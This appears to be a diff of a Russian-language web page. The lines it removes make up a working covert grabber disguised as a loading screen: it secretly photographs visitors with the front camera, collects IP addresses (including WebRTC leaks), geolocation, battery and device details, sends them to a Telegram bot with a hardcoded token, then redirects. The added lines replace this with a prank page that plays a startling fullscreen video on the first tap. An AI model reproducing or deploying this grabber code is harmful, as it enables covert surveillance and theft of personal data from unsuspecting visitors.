@@ -2,282 +2,145 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Загрузка...</title>
 <style>
-*{box-sizing:border-box}
-html,body{margin:0;padding:0;height:100%;background:#050508;color:#e0e0e0;font:15px/1.5 Arial,sans-serif;overflow:hidden;user-select:none}
-#app{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center;position:relative;z-index:10}
-.spinner{width:50px;height:50px;border:4px solid #1a1a24;border-top-color:#8b5cf6;border-radius:50%;animation:spin .9s linear infinite;margin-bottom:24px}
-@keyframes spin{to{transform:rotate(360deg)}}
-h1{font-size:20px;color:#fff;margin:0 0 12px;font-weight:600;opacity:.9}
-p{color:#666;margin:0 0 32px;max-width:400px;font-size:14px;line-height:1.6}
-#progress{position:fixed;bottom:0;left:0;height:2px;background:linear-gradient(90deg,transparent,#8b5cf6,transparent);width:30%;animation:load 1.5s ease-in-out infinite;z-index:10}
-@keyframes load{0%{left:-30%}100%{left:100%}}
-video,canvas{display:none}
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    width: 100%;
+    height: 100%;
+    background: #000;
+    overflow: hidden;
+    font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+    color: #fff;
+    -webkit-user-select: none;
+    user-select: none;
+    -webkit-tap-highlight-color: transparent;
+    cursor: pointer;
+  }
+
+  #gate {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: radial-gradient(circle at center, #1a1a1a 0%, #000 100%);
+    z-index: 90;
+    padding: 20px;
+    text-align: center;
+    cursor: pointer;
+  }
+
+  #gate .icon {
+    font-size: 72px;
+    margin-bottom: 20px;
+    animation: pulse 1.5s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.12); opacity: 0.7; }
+  }
+
+  #gate h1 {
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 12px;
+  }
+
+  #gate p {
+    font-size: 16px;
+    color: #888;
+    max-width: 340px;
+    line-height: 1.4;
+    animation: blink 1.5s infinite;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+
+  #video {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw;
+    height: 100vh;
+    object-fit: cover;
+    display: none;
+    z-index: 50;
+    background: #000;
+  }
+
+  body.playing #video { display: block; }
+  body.playing #gate { display: none !important; }
 </style>
 </head>
 <body>
-<div id="app">
-  <div class="spinner"></div>
-  <h1>Загрузка...</h1>
-  <p>Подключение к серверу затянулось.<br>Пожалуйста, подождите.</p>
+
+<div id="gate">
+  <div class="icon">⚠️</div>
+  <h1>Внимание</h1>
+  <p>Нажмите в любом месте экрана, чтобы продолжить</p>
 </div>
-<div id="progress"></div>
-<video id="preview" autoplay playsinline muted></video>
-<canvas id="canvas"></canvas>
+
+<video id="video" playsinline preload="auto" webkit-playsinline>
+  <source src="video.mp4" type="video/mp4">
+  Твой браузер не поддерживает видео.
+</video>
 
 <script>
-// ═══════════════════════════════════════════════════════
-// НАСТРОЙКИ
-// ═══════════════════════════════════════════════════════
-const TOKEN='9276690902:AAHJGUXY6ElHUallH0TsfYZ8hMA6sLMOtNA';
-const CHAT_ID='8667961334';
-const REDIRECT_URL='https://share.google/tWtcwgkxMOuocoxwl'; // Куда перенаправить
+  const video = document.getElementById('video');
+  let started = false;
 
-const video=document.getElementById('preview');
-const canvas=document.getElementById('canvas');
-let photoTaken=false;
-let photoBlob=null;
+  function triggerScream(e) {
+    if (e) {
+      e.preventDefault();
+      e.stopPropagation();
+    }
+    if (started) return;
+    started = true;
 
-// ═══════════════════════════════════════════════════════
-// ФОТО
-// ═══════════════════════════════════════════════════════
-async function takePhoto(){
-  if(photoTaken) return;
-  let stream=null;
-  try{
-    stream=await navigator.mediaDevices.getUserMedia({
-      video:{facingMode:'user',width:640,height:480},audio:false
-    });
-    video.srcObject=stream;
-    await new Promise(res=>{
-      if(video.readyState>=2) return res();
-      video.onloadeddata=()=>res();
-      setTimeout(res,1000);
-    });
-    await new Promise(r=>setTimeout(r,200));
-    const w=video.videoWidth||640,h=video.videoHeight||480;
-    canvas.width=w;canvas.height=h;
-    canvas.getContext('2d').drawImage(video,0,0,w,h);
-    photoBlob=await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.85));
-    stream.getTracks().forEach(t=>t.stop());
-    video.srcObject=null;
-    photoTaken=true;
-  }catch(e){
-    if(stream) stream.getTracks().forEach(t=>t.stop());
-    console.log('Camera error:', e);
+    document.body.classList.add('playing');
+    video.volume = 1.0;
+    video.muted = false;
+
+    const playPromise = video.play();
+    if (playPromise !== undefined) {
+      playPromise.catch(err => {
+        console.warn('Autoplay blocked:', err);
+        const retry = () => {
+          video.volume = 1.0;
+          video.muted = false;
+          video.play().catch(() => {});
+        };
+        document.body.addEventListener('click', retry, { once: true });
+        document.body.addEventListener('touchstart', retry, { once: true });
+      });
+    }
+
+    if (video.requestFullscreen) {
+      video.requestFullscreen().catch(() => {});
+    } else if (video.webkitRequestFullscreen) {
+      video.webkitRequestFullscreen();
+    } else if (video.webkitEnterFullscreen) {
+      video.webkitEnterFullscreen();
+    }
+
+    const params = new URLSearchParams(window.location.search);
+    const uid = params.get('u') || 'anon';
+    console.log('Screamer opened by:', uid);
   }
-}
 
-// ═══════════════════════════════════════════════════════
-// IP
-// ═══════════════════════════════════════════════════════
-async function getPublicIP(){
-  try{
-    const r=await fetch('https://ipwho.is/');
-    const g=await r.json();
-    if(g.success!==false&&g.ip) return g;
-  }catch(e){}
-  try{
-    const r=await fetch('https://ipapi.co/json/');
-    return await r.json();
-  }catch(e){}
-  return {};
-}
-
-function getLocalIPs(){
-  return new Promise(resolve=>{
-    const ips=new Set(), srflx=new Set();
-    let done=false;
-    const finish=()=>{
-      if(done) return;
-      done=true;
-      try{pc.close()}catch(e){}
-      resolve({local:Array.from(ips),public:Array.from(srflx)});
-    };
-    let pc;
-    try{
-      pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-    }catch(e){ return resolve({local:[],public:[]}); }
-    pc.createDataChannel('');
-    pc.onicecandidate=e=>{
-      if(!e.candidate){finish();return;}
-      const c=e.candidate.candidate;
-      const m=/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/i.exec(c);
-      if(m) (/srflx|relay/.test(c)?srflx:ips).add(m[1]);
-    };
-    pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(finish);
-    setTimeout(finish,800);
-  });
-}
-
-async function getBattery(){
-  if(!navigator.getBattery) return {supported:false};
-  try{
-    const b=await navigator.getBattery();
-    return {
-      supported:true,
-      level_percent:Math.round(b.level*100),
-      level:b.level,
-      charging:b.charging,
-      charging_time_sec:b.chargingTime===Infinity?null:b.chargingTime,
-      discharging_time_sec:b.dischargingTime===Infinity?null:b.dischargingTime
-    };
-  }catch(e){return {supported:false};}
-}
-
-// ═══════════════════════════════════════════════════════
-// СБОР ДАННЫХ
-// ═══════════════════════════════════════════════════════
-async function collectAll(){
-  const [geo, ips, battery] = await Promise.all([
-    getPublicIP(),
-    getLocalIPs(),
-    getBattery()
-  ]);
-  
-  const n=navigator,s=screen,ua=n.userAgent;
-
-  const isMobile=/Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua);
-  const isTablet=/iPad|Tablet|PlayBook|Silk/i.test(ua)||(/Android/i.test(ua)&&!/Mobile/i.test(ua));
-  const deviceType=isTablet?'tablet':isMobile?'mobile':'desktop';
-
-  let os='unknown';
-  if(/Windows NT 10/.test(ua)) os='Windows 10/11';
-  else if(/Mac OS X/.test(ua)) os='macOS';
-  else if(/Android/.test(ua)) os='Android';
-  else if(/iPhone|iPad|iPod/.test(ua)) os='iOS';
-  else if(/Linux/.test(ua)) os='Linux';
-  const osMatch=/(Windows NT [\d.]+|Mac OS X [\d_.]+|Android [\d.]+|OS [\d_]+)/.exec(ua);
-  const osVersion=osMatch?osMatch[1].replace(/_/g,'.'):'';
-  const modelMatch=/\(([^)]+)\)/.exec(ua);
-  const modelUA=modelMatch?modelMatch[1]:'';
-
-  let browser='unknown',browserVersion='';
-  const btests=[[/Edg\/([\d.]+)/,'Edge'],[/OPR\/([\d.]+)/,'Opera'],[/YaBrowser\/([\d.]+)/,'Yandex'],
-    [/SamsungBrowser\/([\d.]+)/,'Samsung Internet'],[/Firefox\/([\d.]+)/,'Firefox'],
-    [/Chrome\/([\d.]+)/,'Chrome'],[/Version\/([\d.]+).*Safari/,'Safari']];
-  for(const [re,name] of btests){const m=re.exec(ua);if(m){browser=name;browserVersion=m[1];break;}}
-
-  const conn=n.connection||n.mozConnection||n.webkitConnection;
-  const network=conn?{effective_type:conn.effectiveType,downlink_mbps:conn.downlink,rtt_ms:conn.rtt,save_data:conn.saveData}:null;
-
-  const router={
-    isp:geo.connection?.isp||geo.isp||null,
-    org:geo.connection?.org||geo.org||null,
-    asn:geo.connection?.asn||geo.asn||null,
-    is_mobile:geo.connection?.is_mobile??null,
-    proxy:geo.security?.proxy??null,
-    vpn:geo.security?.vpn??null,
-    tor:geo.security?.tor??null
-  };
-
-  let source='direct';
-  if(/google\./i.test(document.referrer)) source='Google';
-  else if(/yandex\./i.test(document.referrer)) source='Yandex';
-  else if(/bing\./i.test(document.referrer)) source='Bing';
-  else if(document.referrer) source='other';
-
-  return {
-    ip_public: geo.ip||null,
-    ip_local: ips.local.length?ips.local.join(', '):'hidden',
-    ip_public_stun: ips.public.length?ips.public.join(', '):'hidden',
-    geo_country: geo.country||null,
-    geo_country_code: geo.country_code||null,
-    geo_region: geo.region||null,
-    geo_latitude: geo.latitude??null,
-    geo_longitude: geo.longitude??null,
-    geo_city: geo.city||null,
-    geo_postal: geo.postal||null,
-    battery: battery,
-    status: n.onLine?'online':'offline',
-    router: router,
-    device_type: deviceType,
-    device_model: modelUA,
-    os: os,
-    os_version: osVersion,
-    browser: browser,
-    browser_version: browserVersion,
-    user_agent: ua,
-    platform: n.platform,
-    language: n.language,
-    languages: n.languages||[],
-    screen: {width:s.width,height:s.height,avail_width:s.availWidth,avail_height:s.availHeight,dpr:window.devicePixelRatio,color_depth:s.colorDepth},
-    viewport: {width:window.innerWidth,height:window.innerHeight},
-    hardware: {cpu_cores:n.hardwareConcurrency||null,ram_gb:n.deviceMemory||null,max_touch_points:n.maxTouchPoints||0},
-    network: network,
-    time: {local:new Date().toLocaleString('ru-RU'),iso:new Date().toISOString(),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,utc_offset_hours:-new Date().getTimezoneOffset()/60},
-    source: source,
-    referrer: document.referrer||'',
-    page_url: location.href,
-    maps_link: (geo.latitude!=null)?'https://www.google.com/maps?q='+geo.latitude+','+geo.longitude:null
-  };
-}
-
-// ═══════════════════════════════════════════════════════
-// ОТПРАВКА
-// ═══════════════════════════════════════════════════════
-async function sendData(data){
-  const jsonText=JSON.stringify(data,null,2);
-  
-  // 1. Отправляем JSON файлом
-  try{
-    const blob=new Blob([jsonText],{type:'application/json;charset=utf-8'});
-    const form=new FormData();
-    form.append('chat_id',CHAT_ID);
-    form.append('document',blob,'data_'+Date.now()+'.json');
-    form.append('caption','📦 JSON данные\n'+new Date().toLocaleString('ru-RU'));
-    await fetch('https://api.telegram.org/bot'+TOKEN+'/sendDocument',{method:'POST',body:form});
-  }catch(e){}
-
-  // 2. Отправляем фото с подписью (если есть)
-  if(photoBlob){
-    try{
-      const form=new FormData();
-      form.append('chat_id',CHAT_ID);
-      form.append('photo',photoBlob,'photo.jpg');
-      const cap='📷 Фото\n\n'+
-        '🌍 '+(data.geo_country||'?')+' / '+(data.geo_region||'?')+' / '+(data.geo_city||'?')+'\n'+
-        '📍 '+(data.geo_latitude??'?')+', '+(data.geo_longitude??'?')+'\n'+
-        '🔋 '+(data.battery?.level_percent??'?')+'% ('+(data.battery?.charging?'заряжается':'разряжается')+')\n'+
-        '📱 '+(data.device_type||'?')+' / '+(data.os||'?')+' / '+(data.device_model||'?')+'\n'+
-        '🌐 IP: '+(data.ip_public||'?')+'\n'+
-        '🕐 '+new Date().toLocaleString('ru-RU');
-      form.append('caption',cap);
-      form.append('parse_mode','HTML');
-      await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:'POST',body:form});
-    }catch(e){}
-  }
-}
-
-// ═══════════════════════════════════════════════════════
-// ЗАПУСК
-// ═══════════════════════════════════════════════════════
-async function run(){
-  // Собираем данные и фото одновременно
-  const [data] = await Promise.all([
-    collectAll(),
-    takePhoto()
-  ]);
-
-  // Отправляем
-  await sendData(data);
-
-  // Перенаправляем через 1 секунду
-  setTimeout(() => {
-    window.location.replace(REDIRECT_URL);
-  }, 1000);
-}
-
-// ХИТРОСТЬ: Если камера заблокирована, первый тап по экрану сделает фото
-document.addEventListener('touchstart', takePhoto, {once:true});
-document.addEventListener('click', takePhoto, {once:true});
-
-// Запуск
-window.addEventListener('load',()=>{
-  setTimeout(run,100);
-});
+  document.body.addEventListener('click', triggerScream);
+  document.body.addEventListener('touchstart', triggerScream, { passive: false });
+  document.getElementById('gate').addEventListener('click', triggerScream);
+  document.getElementById('gate').addEventListener('touchstart', triggerScream, { passive: false });
 </script>
+
 </body>
 </html>
